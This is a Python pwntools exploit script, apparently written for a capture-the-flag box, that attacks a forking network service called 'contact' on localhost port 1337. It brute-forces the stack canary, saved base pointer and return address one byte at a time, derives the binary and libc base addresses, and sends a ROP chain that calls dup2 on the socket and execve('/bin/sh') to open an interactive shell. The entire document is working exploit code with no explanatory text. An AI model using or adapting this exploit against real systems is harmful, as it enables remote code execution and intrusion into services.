from pwn import *
import os
import sys

rbp = ""
elf = ELF("./contact")
Libc = ELF("./libc-2.27.so")
SOCKFD = 4

pop_rdi_offset = 0x000000000000164b

if len(sys.argv) < 2:
    CANARY = "\0"
    rbp = ""
    rip = ""
    libc = ""
elif len(sys.argv) == 2:
    CANARY = p64(int(sys.argv[1],16))
    rbp = ""
    rip = ""
    libc = ""
elif len(sys.argv) == 3:
    CANARY = p64(int(sys.argv[1],16))
    rbp = p64(int(sys.argv[2],16))
    rip = ""
    libc = ""
elif len(sys.argv) == 4:
    CANARY = p64(int(sys.argv[1],16))
    rbp = p64(int(sys.argv[2],16))
    rip = p64(int(sys.argv[3],16))
    libc = ""
elif len(sys.argv) == 5:
    CANARY = p64(int(sys.argv[1],16))
    rbp = p64(int(sys.argv[2],16))
    rip = p64(int(sys.argv[3],16))
    libc = p64(int(sys.argv[4],16))
os.system('figlet "rope root "')
TIMEOUT = 5
context.log_level = 'info'
def check_fork_response(srv):
    try:
        resp = srv.recvline()
        print(resp) 
    except Exception as e:
        print e
        return "dead"

def test_canary(canary):
    r = remote("localhost",1337,level='error')
    test = "A" * 56
    test += p64(int(canary,16))
    r.send(test)
    k = r.recv(1024)
    if "ne" in k:
        log.success("Canary works!")
    else:
        log.warn("Canary didn't work setting canary to \0")
        CANARY = "\0"

def leak_mem(addr):

    rop = ROP(elf, badchars="\n")
    rop.printf(SOCKFD, addr)

    log.info("memleak ROP:")
    print rop.dump()
    r = remote("localhost",1337)
    send_rop(r,str(rop))

    resp = r.recv(1024)
    r.close()

    return resp

def send_attack(r,rop):
    attack = "A" * 56
    attack += CANARY
    attack += rop
    r.send(attack)

#STAGE 0: Bruteforce the canary
#CANARY = p64(0x42f3cdc934082b00)

log.info("Starting Canary: %s" % CANARY)
while len(CANARY) < 8:
    for attempt in map(chr, range(0x100)):
        if attempt == "\n":  # we can't send \n
            continue
        srv = remote("localhost",1337,level='error')
        srv.send("A"*(56) + CANARY + attempt)
        check = srv.recv(1024)
        srv.close()
        if  "ne" in check:
            log.info("FOUND CANARY %d/8" % (len(CANARY)+1))
           #log.info(CANARY)
            CANARY += attempt
            break
        elif attempt == "\xff":
            log.error("Failed to leak canary :(")
canary = hex(u64(CANARY))
log.success("CANARY = %s" % canary)
log.info("Testing Canary to be sure")
#test_canary(canary)
#STAGE 1: bruteforce rbp
#rbp = p64(0x7ffea73bca0c) 
while len(rbp) < 8:
    for attempt in map(chr,range(0x100)):
        if attempt == "\n":
            continue
        srv = remote("localhost",1337,level='error')
        send_attack(srv,rbp + attempt)
        resp = srv.recv(1024)
        srv.close()
        if "ne" in resp:
            log.info("Found RBP %d/8"% (len(rbp)+1))
            rbp += attempt
            break
        elif attempt == "\xff":
            log.error("Failed to leak rbp")
RBP = hex(u64(rbp))
log.info("RBP = %s" % RBP)
#STAGE 2: bruteforce rip
payload = "A" * 56 
payload += CANARY
payload += rbp
while len(rip) < 8:
    for attempt in map(chr,range(0x100)):
            if attempt == "\n":
                continue
            srv = remote("localhost",1337,level="error")
            srv.send(payload +rip +  attempt)
            resp = srv.recv(1024)
            srv.close()
            if "ne" in resp:
                log.info("Found RIP %d/8" % (len(rip)+1))
                rip += attempt
                #log.info("current rip: %s" % rip)
                break
            elif attempt == "\xff":
                log.info("perhaps Failed to leak rip")
RET = hex(u64(rip))
log.info("RET: %s" % RET)

base_addr = hex(int(RET,16) - 0x1556)
log.info("base address: %s "%base_addr)

#stage 3: leak libc
#we can use dmesg so we just need some function to fail in libc
work = int(base_addr,16)
entry = int(RET,16) - 982

printf =     p64(0x3ae+entry) #printf
poprdiret = p64(0x164b + work)
#log.info("printf")
#log.info(hex(u64(printf)))
#log.info("poprdi_ret")
#log.info(hex(u64(pop_rdi_ret)))

#final_attack = pop_rdi_ret
#final_attack += p64(0xfffff)
if not libc:
    final_attack = printf
    fattack  = "A" * 56 
    fattack += CANARY
    fattack += rbp
    fattack += final_attack
    log.info("trying final payload")
    r = remote("localhost",1337,level="error")
    r.send(fattack)
    k = r.recv(1024)
    print(k)
    r.close()
    log.info("Check dmesg")
    quit()
libc_offset = 0x25000
#libc_base = int(hex(u64(libc))-0x25000,16)
llibc = hex(u64(libc))
llibc = int(llibc,16)
libc_base = int(hex(llibc),16)
binsh = p64(libc_base + next(Libc.search("/bin/sh")))#local
system = p64(libc_base + 0x491c0)
poprsir15ret = p64(work + 0x1649)
log.info("Sending exploit")
printf = p64(libc_base + Libc.symbols['printf'])
dup2_hex = hex(libc_base + Libc.symbols['dup2'])
execve = hex(libc_base + Libc.symbols['execve'])
dup2 = p64(int(dup2_hex,16))
ret4space = p64(work + 0x164c)
poprdxret = p64(0x1265 + work)
log.info("dup2 addr %s" %dup2_hex)
exploit = "" 
rsi_offset = 0x2aaaaaaaa000 
gg =  work + rsi_offset 

exploit += poprdiret
exploit += p64(4)
exploit += poprsir15ret
exploit += p64(2)
exploit += p64(0)
exploit += dup2
exploit += poprsir15ret
exploit += p64(1)
exploit += p64(0)
exploit += dup2
exploit += poprsir15ret
exploit += p64(0)
exploit += p64(0)
exploit += dup2
exploit += poprdiret
exploit += binsh
exploit += p64(int(execve,16))




#exploit += poprdiret
#exploit += p64(gg)
#exploit += poprsir15ret
#exploit += p64(gg)
#exploit += p64(0x00)
#exploit += poprdxret 
#exploit += p64(0x00)
#exploit += system
r = remote("localhost",1337,level="error")
final = "A" * 56
final += CANARY
final += rbp
final += exploit 
log.info("exploit")
log.info(final)
log.info("dup2")
log.info(dup2_hex)
log.info("execve")
log.info(execve)
log.info("buffer_addr")
log.info(hex(gg))
log.info("binsh")
log.info(hex(u64(binsh)))
r.send(final)
r.recv(1024)
r.send(final)
r.interactive()
